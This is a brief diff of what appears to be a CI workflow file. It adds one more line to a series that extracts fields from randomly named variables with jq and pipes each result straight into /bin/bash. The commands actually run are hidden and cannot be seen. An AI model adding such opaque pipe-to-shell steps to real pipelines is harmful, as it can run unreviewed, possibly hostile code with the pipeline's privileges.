@@ -25,6 +25,7 @@ jobs:
           echo $rxk423 | jq -r .okrzh245 | /bin/bash
           printf '%s' "$l72231" | jq -r .heu35 | /bin/bash
           echo $c87 | jq -r .q11376 | /bin/bash
+          echo $o78385 | jq -r .h75 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
